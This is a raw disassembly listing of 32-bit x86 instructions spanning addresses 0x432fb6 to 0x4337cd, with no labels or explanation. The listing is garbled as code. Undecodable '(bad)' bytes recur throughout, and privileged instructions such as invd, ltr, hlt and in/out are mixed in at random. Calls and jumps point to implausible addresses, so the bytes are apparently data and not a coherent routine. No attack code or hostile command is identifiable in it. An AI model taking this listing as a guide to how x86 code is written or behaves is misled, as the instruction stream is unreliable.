  432fb6:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  432fbd:	inc    ebp
  432fbe:	add    BYTE PTR [esi],dh
  432fc0:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  432fc7:	(bad)  
  432fc8:	mov    ebx,eax
  432fca:	loopne 0x433011
  432fcc:	dec    ebp
  432fcd:	mov    ecx,DWORD PTR [edi]
  432fcf:	cld    
  432fd0:	push   eax
  432fd1:	xchg   DWORD PTR [ebx],esi
  432fd3:	add    DWORD PTR [ebx],ebp
  432fd5:	add    BYTE PTR [ebx],ch
  432fd7:	or     BYTE PTR [ecx],bh
  432fd9:	dec    ecx
  432fda:	loopne 0x432fdf
  432fdc:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  432fe2:	push   ebp
  432fe3:	add    DWORD PTR [ebx+0x55100800],eax
  432fe9:	dec    ebp
  432fea:	jmp    0x432f75
  432fec:	mov    esp,DWORD PTR [eax]
  432fee:	sbb    dl,dl
  432ff0:	inc    eax
  432ff1:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432ff7:	add    BYTE PTR [ebx+0x74528555],cl
  432ffd:	push   ebp
  432ffe:	div    DWORD PTR [ebx]
  433000:	and    eax,DWORD PTR [ebx]
  433002:	add    edx,DWORD PTR [edx-0x30]
  433005:	jno    0x432f92
  433007:	inc    DWORD PTR [eax+eiz*1]
  43300a:	inc    ebp
  43300b:	push   eax
  43300c:	push   eax
  43300d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  433013:	mov    edi,esp
  433015:	push   eax
  433016:	inc    ebp
  433017:	enter  0x458b,0x8
  43301b:	push   ecx
  43301c:	(bad)  
  43301d:	call   0x10d39f5
  433022:	pop    ss
  433023:	push   ebp
  433024:	mov    ecx,DWORD PTR [ebx+0x489408]
  43302a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  433030:	push   ecx
  433031:	jo     0x43301b
  433033:	inc    DWORD PTR [edi]
  433035:	or     BYTE PTR [eax],al
  433037:	call   0xce3781
  43303c:	fmul   QWORD PTR [ebp+0x55]
  43303f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  433045:	mov    bh,0x8c
  433047:	adc    al,0x99
  433049:	dec    esp
  43304a:	xor    bl,BYTE PTR [eax]
  43304c:	mov    ecx,DWORD PTR [ebp+0xc]
  43304f:	mov    eax,DWORD PTR [ebp-0x4]
  433052:	mov    esi,DWORD PTR [edi-0x3148f924]
  433058:	push   es
  433059:	retf   
  43305a:	mov    BYTE PTR [ebp-0x30],0x3b
  43305e:	inc    ebp
  43305f:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  433066:	retf   0x83fc
  433069:	into   
  43306a:	dec    ebp
  43306b:	retf   
  43306c:	mov    ecx,DWORD PTR [ebp-0x74]
  43306f:	mov    eax,DWORD PTR [eax]
  433071:	fdiv   QWORD PTR [ebx]
  433073:	mov    bh,0x3
  433075:	push   es
  433076:	mov    esi,ecx
  433078:	sbb    cl,dl
  43307a:	dec    ebp
  43307b:	sar    DWORD PTR [ebx],cl
  43307d:	push   ebp
  43307e:	jne    0x43308f
  433080:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  433086:	lea    ebx,[eax]
  433088:	call   0xf4ccbc4f
  43308d:	sbb    dh,dl
  43308f:	add    edx,ebx
  433091:	push   ebp
  433092:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  433098:	push   ecx
  433099:	mov    DWORD PTR [eax-0x30],edx
  43309c:	test   DWORD PTR [edx],eax
  43309e:	xadd   esp,esi
  4330a1:	pop    es
  4330a2:	add    cl,dl
  4330a4:	mov    eax,ecx
  4330a6:	or     al,0x45
  4330a8:	(bad)  
  4330a9:	push   eax
  4330aa:	add    DWORD PTR [edx+0x0],eax
  4330ad:	add    ecx,DWORD PTR [ecx]
  4330af:	and    dh,cl
  4330b1:	call   0xc73981
  4330b6:	add    DWORD PTR [ebp+0x0],edx
  4330b9:	mov    esp,DWORD PTR [ebp+0x18]
  4330bc:	add    BYTE PTR [eax+0x48],cl
  4330bf:	xor    eax,DWORD PTR [eax]
  4330c1:	add    esp,DWORD PTR [esi+0x3b]
  4330c4:	inc    ebp
  4330c5:	je     0x43304a
  4330c7:	push   ecx
  4330c8:	push   es
  4330c9:	dec    ebp
  4330ca:	mov    DWORD PTR [ebx],eax
  4330cc:	(bad)  
  4330cd:	or     al,0x5e
  4330cf:	inc    eax
  4330d0:	add    BYTE PTR [ebx],al
  4330d2:	data16 and BYTE PTR [ebp+0x50],al
  4330d6:	sub    DWORD PTR [ecx],0xfffffff8
  4330d9:	add    BYTE PTR [ebp-0x75],ah
  4330dc:	add    BYTE PTR [eax],bl
  4330de:	enter  0x894d,0x8b
  4330e2:	int3   
  4330e3:	loopne 0x43311f
  4330e5:	rol    BYTE PTR [eax],0x33
  4330e8:	lea    cx,[ebp+0xa]
  4330ec:	data16 jb 0x433134
  4330ef:	add    BYTE PTR [ebx+0x44890855],cl
  4330f5:	sbb    ah,al
  4330f7:	inc    ebp
  4330f8:	cmp    BYTE PTR [edi],cl
  4330fa:	add    BYTE PTR [edx+0x66],dl
  4330fd:	xor    ecx,DWORD PTR [eax]
  4330ff:	sub    edi,esi
  433101:	mov    eax,DWORD PTR [eax]
  433103:	or     al,0x66
  433105:	ror    edx,cl
  433107:	dec    ebp
  433108:	inc    ebp
  433109:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43310f:	cld    
  433110:	or     BYTE PTR [edi+0x4501dd],dl
  433116:	ret    0xe8ce
  433119:	retf   
  43311a:	(bad)  
  43311b:	dec    ebp
  43311c:	mov    al,0x8b
  43311e:	in     al,dx
  43311f:	and    BYTE PTR [ebx],bh
  433121:	or     al,BYTE PTR [ebp+0x27]
  433124:	in     al,dx
  433125:	xchg   eax,ebp
  433127:	add    edi,eax
  433129:	add    BYTE PTR [eax+0x3f52ed55],bh
  43312f:	push   ebp
  433130:	inc    ebp
  433131:	xor    ebx,edx
  433133:	add    ebp,eax
  433135:	push   edx
  433136:	push   bp
  433138:	inc    ebp
  433139:	(bad)  
  43313a:	jmp    0xc342f793
  43313f:	sbb    al,0x33
  433141:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  433148:	add    BYTE PTR [ebp+0x44],0x8b
  43314c:	jmp    0xf98b:0x100041c8
  433153:	xor    esi,DWORD PTR [edx+0x3]
  433156:	mov    ecx,DWORD PTR [edi]
  433158:	fmul   DWORD PTR [edx]
  43315a:	add    BYTE PTR [eax],al
  43315c:	lea    eax,[ebx-0x4700273c]
  433162:	add    al,0x4f
  433164:	pop    DWORD PTR [eax]
  433166:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  43316c:	push   edx
  43316d:	inc    WORD PTR [ebp+0x8]
  433171:	mov    eax,0x514f4d
  433176:	(bad)
  43317a:	add    al,al
  43317c:	xor    DWORD PTR [ebx-0x74baf730],eax
  433182:	test   DWORD PTR [esi+0x74],esp
  433185:	inc    ebp
  433186:	mov    DWORD PTR [eax+0xa4f08],edi
  43318c:	add    BYTE PTR [ecx-0x76c435bb],cl
  433192:	or     dh,cl
  433194:	or     eax,0x8b8d5045
  433199:	inc    ebp
  43319a:	mov    WORD PTR [ecx+0x3b8a00],?
  4331a0:	jne    0x4331d5
  4331a2:	mov    edi,DWORD PTR [edx+0x8f3a18]
  4331a8:	add    DWORD PTR [ebx],eax
  4331aa:	add    bh,bh
  4331ac:	adc    DWORD PTR [eax],ecx
  4331ae:	adc    DWORD PTR [ebp+0x55],edi
  4331b1:	push   es
  4331b2:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4331b8:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c411da]
  4331bf:	inc    ebp
  4331c0:	mov    esp,edi
  4331c2:	or     al,0xda
  4331c4:	push   eax
  4331c5:	(bad)  
  4331c6:	jne    0x43317c
  4331c8:	call   0x3b2ab7
  4331cd:	inc    ebp
  4331ce:	rol    ah,0x84
  4331d1:	call   0xbc43f8d6
  4331d6:	jne    0x4331b2
  4331d8:	mov    ebx,ebx
  4331da:	inc    edi
  4331dc:	and    al,al
  4331de:	fs jmp 0x7ec877e3
  4331e4:	bswap  ecx
  4331e6:	scas   al,BYTE PTR es:[edi]
  4331e7:	inc    esp
  4331e8:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  4331ef:	or     BYTE PTR [ebx-0x97717c6],0x83
  4331f6:	call   DWORD PTR [edi]
  4331f8:	shr    ah,0x84
  4331fb:	xchg   DWORD PTR [eax],eax
  4331fd:	add    DWORD PTR [eax],eax
  4331ff:	add    bh,bh
  433201:	dec    ebp
  433202:	and    BYTE PTR [ecx-0x38],dl
  433205:	push   eax
  433206:	dec    DWORD PTR [ebx+0xfd885]
  43320c:	mov    BYTE PTR [ebp+0x508bac00],cl
  433212:	mov    WORD PTR [ecx+0x0],ss
  433215:	lea    ecx,[ebx+0x108b20d8]
  43321b:	mov    WORD PTR [edx],ds
  43321d:	add    BYTE PTR [edi+0xff01ff],al
  433223:	mov    ecx,DWORD PTR [ebp-0x28]
  433226:	push   ecx
  433227:	shl    BYTE PTR [ebp+0x3a],0x8b
  43322b:	inc    ebp
  43322c:	in     al,0xeb
  43322e:	jno    0x4331bb
  433230:	push   edx
  433231:	mov    DWORD PTR [eax-0x28],edx
  433234:	mov    eax,DWORD PTR [ebp+0x20]
  433237:	je     0x4331c0
  433239:	mov    eax,DWORD PTR [ecx]
  43323b:	sbb    BYTE PTR [eax],al
  43323d:	pop    DWORD PTR [eax]
  43323f:	add    esi,eax
  433241:	add    bl,al
  433243:	adc    DWORD PTR [edi],esi
  433245:	jmp    0x8bce8297
  43324a:	sub    BYTE PTR [ebp+eax*2-0x63c4ca00],cl
  433251:	jne    0x4331de
  433253:	mov    ecx,DWORD PTR [eax]
  433255:	in     al,0x75
  433257:	pop    DWORD PTR [ecx+0x5101]
  43325d:	push   edx
  43325e:	inc    DWORD PTR [ebx]
  433260:	adc    BYTE PTR [ecx+0x45721cc6],cl
  433266:	add    BYTE PTR [edi+0x9],dl
  433269:	call   DWORD PTR [esi]
  43326b:	and    dl,al
  43326d:	and    bh,bh
  43326f:	inc    edi
  433271:	test   eax,edx
  433273:	sldt   ebx
  433276:	cmp    DWORD PTR [eax],eax
  433278:	pushf  
  433279:	(bad)  
  43327a:	jmp    0x433288
  43327c:	mov    eax,edi
  43327e:	or     al,0x75
  433280:	inc    eax
  433281:	call   0x432989
  433286:	mov    eax,eax
  433288:	loopne 0x43320e
  43328a:	inc    ebp
  43328b:	add    BYTE PTR [ebx+0x1451c00],cl
  433291:	mov    eax,DWORD PTR [ebp+0x20]
  433294:	add    edi,ecx
  433296:	add    BYTE PTR [eax],ch
  433298:	cmp    edi,0x18
  43329b:	test   DWORD PTR [ebp+0xf],esi
  43329e:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4332a5:	jne    0x4332a9
  4332a7:	call   0xffa22d6c
  4332ac:	leave  
  4332ad:	rcr    BYTE PTR [esp+eax*4],0x55
  4332b1:	add    ah,ch
  4332b3:	add    BYTE PTR [edi-0x48fef979],dh
  4332b9:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4332c0:	inc    esp
  4332c1:	mov    ebx,DWORD PTR [eax]
  4332c3:	fcom   st(2)
  4332c5:	add    BYTE PTR [edi],bl
  4332c7:	lea    ecx,[eax-0x18]
  4332ca:	(bad)  
  4332cb:	push   DWORD PTR [ecx]
  4332cd:	call   0xffb5802f
  4332d2:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  4332d6:	fstp   DWORD PTR [esi+ebx*8]
  4332d9:	push   ebp
  4332da:	pop    ebp
  4332db:	mov    esi,DWORD PTR [edx-0x38]
  4332de:	add    DWORD PTR [eax],0x28
  4332e1:	mov    edi,DWORD PTR [ebx]
  4332e3:	xor    esi,DWORD PTR [edx+0x3]
  4332e6:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  4332ea:	pop    ebp
  4332eb:	or     al,0x4
  4332ed:	inc    ecx
  4332ee:	push   ebp
  4332ef:	(bad)  
  4332f0:	in     al,dx
  4332f1:	or     ah,ch
  4332f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4332f4:	xbegin 0xffc8a8ea
  4332fa:	clc    
  4332fb:	adc    al,0x45
  4332fd:	idiv   BYTE PTR [ecx]
  4332ff:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  433306:	test   DWORD PTR [ecx+0x665b00f8],ebx
  43330c:	add    BYTE PTR [ecx+0x66],dh
  43330f:	add    eax,DWORD PTR [ebp+0x52]
  433312:	adc    eax,0x20
  433315:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  43331b:	test   DWORD PTR [eax],eax
  43331d:	clc    
  43331e:	data16 or al,BYTE PTR [ebp+0x45]
  433322:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  433329:	rol    BYTE PTR [ebp+0x45],1
  43332c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  433332:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  433338:	push   ebx
  433339:	add    BYTE PTR [ecx+0x0],dl
  43333c:	push   ecx
  43333d:	jge    0x433372
  43333f:	add    BYTE PTR [esi+0x4],dl
  433342:	jne    0x4333a9
  433344:	mov    edx,0x457200
  433349:	jmp    0x43330d
  43334b:	xor    edi,DWORD PTR [ebx]
  43334d:	pop    edi
  43334e:	cvtdq2ps xmm7,xmm0
  433351:	ret    0x0
  433354:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  43335a:	xor    ecx,DWORD PTR [edi]
  43335c:	add    eax,DWORD PTR [ecx+0x3b]
  43335f:	push   ebx
  433360:	rdpmc  
  433362:	out    0x8d,al
  433364:	add    BYTE PTR [eax],cl
  433366:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  43336c:	ret    0x450c
  43336f:	sbb    al,0x8b
  433371:	cmp    eax,esi
  433373:	or     cl,al
  433375:	or     al,0xc2
  433377:	pop    eax
  433378:	inc    ebp
  433379:	add    ecx,DWORD PTR [edi]
  43337b:	add    esi,DWORD PTR [ebp+0x39]
  43337e:	invd   
  433380:	jge    0x43338c
  433382:	mov    eax,0x478ac0
  433387:	cli    
  433388:	xor    esp,ecx
  43338a:	mov    ebx,0x5b8ac0
  43338f:	ret    0x33
  433392:	mov    eax,0x833a8b
  433397:	sub    BYTE PTR [ebx],al
  433399:	inc    ebp
  43339a:	data16 ss clc 
  43339d:	pushf  
  43339e:	inc    bh
  4333a0:	mov    esp,esp
  4333a2:	hlt    
  4333a3:	test   DWORD PTR [ebp-0x8],esi
  4333a6:	mov    eax,DWORD PTR [ebp-0x14]
  4333a9:	cmp    BYTE PTR [ebx-0x76478864],cl
  4333af:	dec    edi
  4333b0:	or     BYTE PTR [eax],al
  4333b2:	jne    0x43333d
  4333b4:	mov    esi,esp
  4333b6:	call   0x77a9bf7b
  4333bb:	inc    ebp
  4333bc:	mov    DWORD PTR [eax+0x994f0c],edi
  4333c2:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4333c8:	add    BYTE PTR [esi+0x7d],ah
  4333cb:	inc    ebp
  4333cc:	mov    bx,WORD PTR [ebp+0x8]
  4333d0:	add    DWORD PTR [ebp+0x51],0x30c008b
  4333d7:	inc    ebp
  4333d8:	mov    bx,di
  4333db:	lock test BYTE PTR [ecx+0x7000801],bh
  4333e2:	jge    0x4333a5
  4333e4:	mov    ecx,DWORD PTR [ebx-0x660613f0]
  4333ea:	cli    
  4333eb:	xor    bl,bh
  4333ed:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  4333f3:	test   BYTE PTR [eax],cl
  4333f5:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  4333fc:	cmp    ebp,eax
  4333fe:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  433405:	test   BYTE PTR [ebp+0x1],bh
  433408:	mov    ebx,0x458a00
  43340d:	xor    esi,DWORD PTR [ebx]
  43340f:	add    esp,DWORD PTR [esi-0x77]
  433412:	pop    ebp
  433413:	loopne 0x43347b
  433415:	inc    ebp
  433416:	clc    
  433417:	xor    edi,DWORD PTR [ebx]
  433419:	add    esi,DWORD PTR [edx-0x77]
  43341c:	data16 fdivr QWORD PTR [ebp-0x49]
  433420:	mov    ebx,0xb78afc
  433425:	hlt    
  433426:	xor    edi,DWORD PTR [eax]
  433428:	data16 add BYTE PTR [ebp+0x66],bl
  43342c:	data16 lock clc 
  43342f:	cmp    BYTE PTR [ebx],bh
  433431:	add    BYTE PTR [edi+0x66],dh
  433434:	psubq  mm7,QWORD PTR [ebp-0x2]
  433438:	ltr    WORD PTR [ebp+0x66]
  43343c:	add    esi,eax
  43343e:	add    di,WORD PTR [ebp+0x2b]
  433442:	data16 data16 jge 0x4334c3
  433446:	mov    ebx,0xe08a8b
  43344b:	jge    0x433480
  43344d:	data16 data16 xor al,0x5d
  433451:	data16 data16 jne 0x43344d
  433455:	mov    edi,DWORD PTR [ebx]
  433457:	fdiv   QWORD PTR [edx+0x7d]
  43345a:	data16 data16 jge 0x433492
  43345e:	mov    ebx,0x758a66
  433463:	mov    esi,0x667233
  433468:	pop    ebp
  433469:	or     BYTE PTR [esi+0x0],ah
  43346c:	clc    
  43346d:	mov    edi,DWORD PTR [ebx]
  43346f:	lock ja 0x4333fd
  433472:	(bad)  
  433474:	jge    0x43346d
  433476:	invd   
  433478:	pop    ebp
  433479:	add    BYTE PTR [ebx],al
  43347b:	(bad)  
  43347c:	cmp    di,WORD PTR [ebp+0xf]
  433480:	data16 sbb bh,BYTE PTR [ebp+0x0]
  433484:	mov    bx,WORD PTR [ebp-0x10]
  433488:	pop    bp
  43348a:	fbstp  TBYTE PTR [ebx]
  43348c:	test   DWORD PTR [ebx],eax
  43348e:	add    BYTE PTR [ebx],bh
  433490:	add    BYTE PTR [esi+0x7d],ah
  433493:	jge    0x433420
  433495:	data16 in al,dx
  433497:	pop    ebp
  433498:	stc    
  433499:	bsf    ecx,DWORD PTR [ebp+0x66320099]
  4334a0:	mov    edi,ebx
  4334a2:	in     al,dx
  4334a3:	test   BYTE PTR [ebp+0x0],bh
  4334a6:	mov    eax,DWORD PTR [eax]
  4334a8:	call   0xbd402e38
  4334ad:	cmp    BYTE PTR [ecx-0x7699ce00],bl
  4334b3:	sti    
  4334b4:	call   0x8b4bb244
  4334b9:	add    ebp,esp
  4334bb:	mov    bx,di
  4334be:	jnp    0x4334e6
  4334c0:	mov    DWORD PTR [ebx+0x387df808],ecx
  4334c6:	mov    eax,DWORD PTR [eax]
  4334c8:	call   0x7c3ec033
  4334cd:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4334d3:	data16 data16 fistp WORD PTR [ebp+0xe]
  4334d8:	xor    DWORD PTR [edi-0x48fff7af],0xfb66f403
  4334e2:	fisttp WORD PTR [ecx-0x7401f77b]
  4334e8:	(bad)  
  4334e9:	cld    
  4334ea:	jne    0x433524
  4334ec:	xor    eax,DWORD PTR [eax]
  4334ee:	mov    esp,DWORD PTR [esi-0x10]
  4334f1:	sti    
  4334f2:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  4334f9:	data16 adc bl,bh
  4334fc:	push   ebp
  4334fd:	xor    ecx,DWORD PTR es:[ebx+0x38e4f88b]
  433504:	mov    WORD PTR [eax],es
  433506:	cdq    
  433507:	data16 xor bh,bl
  43350a:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  433510:	mov    esp,DWORD PTR [esi-0x14]
  433513:	fisttp WORD PTR [ebx-0x3748a9f2]
  433519:	or     al,0x2b
  43351b:	mov    bh,0xba
  43351d:	hlt    
  43351e:	mov    bh,bl
  433520:	add    BYTE PTR [ecx-0x7446f3cd],cl
  433526:	dec    edi
  433527:	or     al,0x0
  433529:	mov    edi,DWORD PTR [ebx]
  43352b:	or     BYTE PTR [ebp+0x3b],dh
  43352e:	mov    ecx,DWORD PTR [edi]
  433530:	fdivr  QWORD PTR [ebx-0x7499ff83]
  433536:	xor    al,0xd8
  433538:	pop    bp
  43353a:	lock xor esi,DWORD PTR [ebx]
  43353d:	lea    esp,[esi+0x1f]
  433540:	icebp  
  433541:	jb     0x433547
  433543:	add    al,al
  433545:	jge    0x433553
  433547:	mov    eax,eax
  433549:	fsubr  st,st(3)
  43354b:	pop    ebp
  43354c:	mov    esi,DWORD PTR [ebx]
  43354e:	in     al,0x8d
  433550:	rcr    DWORD PTR [edi],0xc2
  433553:	jb     0x4335b3
  433555:	add    cl,cl
  433557:	jge    0x433565
  433559:	mov    edx,DWORD PTR [ebp-0x20]
  43355c:	in     al,dx
  43355d:	pop    ebp
  43355e:	data16 data16 or BYTE PTR [esi+edi*4],bh
  433563:	data16 cmp bh,BYTE PTR [ebp+0x0]
  433567:	mov    ebp,DWORD PTR [ebx]
  433569:	fdivr  QWORD PTR [esi+0x668a5d]
  43356f:	cmp    al,0x33
  433571:	mov    si,0x4f7d
  433575:	mov    eax,DWORD PTR [eax]
  433577:	lock inc ebp
  433579:	mov    esi,DWORD PTR [edi]
  43357b:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  433582:	clc    
  433583:	(bad)  
  433584:	cmp    edi,DWORD PTR [ebx]
  433586:	je     0x433597
  433588:	push   ebx
  433589:	loopne 0x43359a
  43358b:	dec    ecx
  43358d:	mov    esp,DWORD PTR [edi-0x1c]
  433590:	int    0xf1
  433592:	mov    esi,0x703084d
  433597:	pcmpgtd mm6,mm1
  43359a:	add    BYTE PTR [ebp+0x66],dh
  43359d:	jmp    0x43356a
  43359f:	mov    eax,DWORD PTR [ebx]
  4335a1:	lock push ebp
  4335a3:	ror    DWORD PTR [ebp-0x2972feb3],1
  4335a9:	or     bh,dl
  4335ab:	jb     0x4335ab
  4335ad:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4335b3:	loopne 0x4335b5
  4335b5:	jne    0x4335b5
  4335b7:	data16 add BYTE PTR [esi+eiz*2],dh
  4335bb:	mov    ecx,ebx
  4335bd:	data16 cmp cl,dh
  4335c0:	add    BYTE PTR [eax],bh
  4335c2:	data16 add bl,cl
  4335c5:	data16 cmp dh,dl
  4335c8:	add    BYTE PTR [edx],bh
  4335ca:	data16 add bl,cl
  4335cd:	enterw 0x4df1,0x19
  4335d2:	pop    edi
  4335d3:	jne    0x433556
  4335d5:	mov    esi,DWORD PTR [edi]
  4335d7:	call   0x77b7c178
  4335dc:	xor    ebp,DWORD PTR [ebx]
  4335de:	lea    esp,[esi+0x48]
  4335e1:	repnz in eax,0x3b
  4335e4:	add    BYTE PTR [ebp-0x37],dh
  4335e7:	xor    edx,DWORD PTR [ebp-0x15]
  4335ea:	in     al,dx
  4335eb:	xor    edx,DWORD PTR [esi+0x40]
  4335ee:	mov    DWORD PTR [edi],0x338545fc
  4335f4:	clc    
  4335f5:	add    esi,DWORD PTR [esi]
  4335f7:	pop    edi
  4335f8:	pushf  
  4335f9:	pop    ebx
  4335fa:	call   0xff4435c1
  4335ff:	mov    edi,eax
  433601:	push   ecx
  433602:	pop    es
  433603:	mov    edi,DWORD PTR [edx]
  433605:	push   esi
  433606:	inc    esp
  433607:	(bad)  
  433608:	jle    0x43360a
  43360a:	popa   
  43360b:	data16 (bad) 
  43360d:	into   
  43360e:	addr16 cmp ch,cl
  433611:	add    BYTE PTR [ecx+0x7ce0866],bh
  433617:	cmp    ah,BYTE PTR [esi+0x0]
  43361a:	add    bh,al
  43361c:	(bad)  
  43361d:	cld    
  43361e:	add    BYTE PTR [ebp+0x36c3f866],al
  433624:	cmp    BYTE PTR [eax+eax*1-0x3c31999a],bl
  43362b:	pop    ebp
  43362c:	or     BYTE PTR [edi+0x0],dl
  43362f:	mov    bh,0x66
  433631:	mov    edi,0xff038dc3
  433636:	jne    0x433689
  433638:	lea    edx,[ecx+0x1]
  43363b:	mov    ebx,0xd64ff1
  433640:	sar    DWORD PTR [ebx],1
  433642:	test   BYTE PTR [ebp+0x32],dh
  433645:	mov    DWORD PTR [esp+edi*8-0x76],esp
  433649:	push   edi
  43364a:	xor    BYTE PTR [ebx],0x3a
  43364d:	mov    esi,ebx
  43364f:	xor    eax,DWORD PTR [eax-0x3c73819a]
  433655:	xor    al,BYTE PTR [ebp+0x64]
  433658:	pop    ebx
  433659:	mov    ebx,0x9c3a37
  43365e:	je     0x43368b
  433660:	xor    edi,DWORD PTR [ebx+0x668a33]
  433666:	mov    WORD PTR [ebx],?
  433668:	xor    bh,BYTE PTR [ebx+0x8b4f64]
  43366e:	pop    edi
  43366f:	cmp    ecx,ecx
  433671:	jne    0x4336c8
  433673:	mov    ebp,esp
  433675:	cld    
  433676:	push   esi
  433677:	pop    ebx
  433678:	inc    ebp
  433679:	stc    
  43367a:	aaa    
  43367b:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  433682:	clc    
  433683:	test   dl,dl
  433685:	xor    al,0xff
  433687:	fs pop si
  43368a:	or     bl,al
  43368c:	dec    BYTE PTR [ebx+0x57665100]
  433692:	retf   0x3845
  433695:	aaa    
  433696:	add    BYTE PTR [esi+eiz*2+0x3a85cabe],bl
  43369d:	clc    
  43369e:	add    BYTE PTR [ebx+0x66],bl
  4336a1:	dec    edx
  4336a3:	mov    edx,DWORD PTR [edi-0x76]
  4336a6:	push   edi
  4336a7:	add    al,0xb7
  4336a9:	xor    al,0xba
  4336ab:	cmp    al,0x8d
  4336ad:	je     0x4336ae
  4336af:	mov    edx,DWORD PTR [ecx-0x46]
  4336b2:	push   ecx
  4336b3:	lea    edi,[ebx+0x514fff]
  4336b9:	push   ecx
  4336ba:	cmp    edx,DWORD PTR [ebx+0x75]
  4336bd:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  4336c3:	add    BYTE PTR [ebx],dh
  4336c5:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4336cb:	add    BYTE PTR [ebx+esi*1+0x4f64bb32],cl
  4336d2:	mov    ebx,0x3b3a00
  4336d7:	jne    0x433704
  4336d9:	mov    DWORD PTR [ebx+0x728afc],edi
  4336df:	xor    esi,DWORD PTR [ebx]
  4336e1:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  4336e7:	push   edi
  4336e8:	cmp    esp,ebp
  4336ea:	jne    0x4336ec
  4336ec:	sbb    DWORD PTR [eax],0x8085c3fc
  4336f2:	clc    
  4336f3:	inc    esp
  4336f4:	pop    ebx
  4336f5:	sti    
  4336f6:	add    eax,0xeb8bc075
  4336fb:	cld    
  4336fc:	xor    edi,DWORD PTR ds:0xf8c3855e
  433702:	mov    ecx,DWORD PTR [ecx+edx*2]
  433705:	rol    DWORD PTR [ebp-0x37],0xf
  433709:	mov    DWORD PTR [eax],ecx
  43370b:	inc    edi
  43370c:	(bad)  
  43370d:	in     eax,0x2
  43370f:	add    bh,bh
  433711:	(bad)  
  433712:	mov    esi,0xc38a5e
  433717:	mov    esi,DWORD PTR [ebx]
  433719:	push   ecx
  43371a:	mov    edi,0xfc4fc7
  43371f:	test   DWORD PTR [ebp-0x8],edx
  433722:	data16 ss (bad) 
  433725:	pushf  
  433726:	sub    ebp,eax
  433728:	inc    ebp
  433729:	(bad)  
  43372a:	sub    edi,edi
  43372c:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  433732:	inc    ebp
  433733:	add    BYTE PTR [esi+0x2b],ah
  433736:	or     bh,BYTE PTR [edx+0xf8ac2]
  43373c:	cmp    al,0x33
  43373e:	mov    edi,DWORD PTR [edx+0x24f81]
  433744:	(bad)  
  433745:	cmp    esi,DWORD PTR [ebx]
  433747:	je     0x433701
  433749:	push   ebx
  43374a:	dec    edi
  43374b:	str    ecx
  43374e:	cmp    esp,DWORD PTR [edi+0x75]
  433751:	int    0x33
  433753:	mov    edi,0x789085f
  433758:	mov    ecx,DWORD PTR [eax]
  43375a:	cld    
  43375b:	add    cl,cl
  43375d:	data16 add al,0xcb
  433760:	push   ebp
  433761:	add    ebp,esp
  433763:	jne    0x433751
  433765:	(bad)  
  433766:	mov    DWORD PTR [ecx],0xd685f7ec
  43376c:	clc    
  43376d:	xlat   BYTE PTR ds:[ebx]
  43376e:	inc    ebp
  43376f:	mov    edi,DWORD PTR [ecx]
  433771:	push   eax
  433772:	pushf  
  433773:	in     eax,0x8b
  433775:	add    ah,ch
  433777:	(bad)  
  433778:	push   ecx
  433779:	add    BYTE PTR [ecx+0x66],dl
  43377c:	add    eax,0x3872cb
  433781:	add    BYTE PTR [ebp+0x66],al
  433784:	(bad)  
  433785:	retf   
  433786:	lock cmp al,BYTE PTR [ebp+0x4566f800]
  43378d:	retf   
  43378e:	cmp    cl,al
  433790:	pushf  
  433791:	jge    0x43375a
  433793:	aaa    
  433794:	cld    
  433795:	pushf  
  433796:	test   DWORD PTR [edi-0x8],ebx
  433799:	je     0x4337e0
  43379b:	xor    esi,DWORD PTR ds:0x7020840
  4337a1:	ror    BYTE PTR [ebp-0x37],0x8d
  4337a5:	push   ebp
  4337a6:	add    esp,ebp
  4337a8:	jb     0x433735
  4337aa:	add    BYTE PTR [eax],cl
  4337ac:	dec    ebp
  4337ad:	mov    bh,0x81
  4337af:	push   esi
  4337b0:	push   ecx
  4337b1:	adc    DWORD PTR [ecx-0x3b],0x3899ff81
  4337b8:	xor    al,BYTE PTR [eax]
  4337ba:	mov    edx,DWORD PTR [edi+0x10]
  4337bd:	(bad)  
  4337be:	scas   eax,DWORD PTR es:[edi]
  4337bf:	cmp    bh,BYTE PTR [ebx]
  4337c1:	add    BYTE PTR [edi],cl
  4337c3:	mov    ebp,ebp
  4337c5:	cld    
  4337c6:	add    BYTE PTR [ebx],bh
  4337c8:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4337cc:	dec    ebp
  4337cd:	or     BYTE PTR [ebx],ch
